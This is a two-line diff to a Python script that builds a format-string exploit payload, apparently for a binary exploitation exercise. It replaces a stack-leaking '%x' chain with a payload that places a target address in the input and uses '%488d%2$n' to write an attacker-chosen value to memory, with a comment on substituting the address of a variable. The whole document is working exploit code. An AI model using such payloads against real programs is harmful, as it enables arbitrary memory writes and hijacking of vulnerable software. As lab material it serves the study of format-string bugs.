@@ -1,2 +1,3 @@
-payload = b'AAAA\xc0\xd3\xff\xff' + b'%x'*8
+#Change bytes between AAAA and BBBB to bytes of the address where i is
+payload = b'AAAA\x80\xd6\xff\xffBBBB%488d' + b'%2$n'
 print(payload)
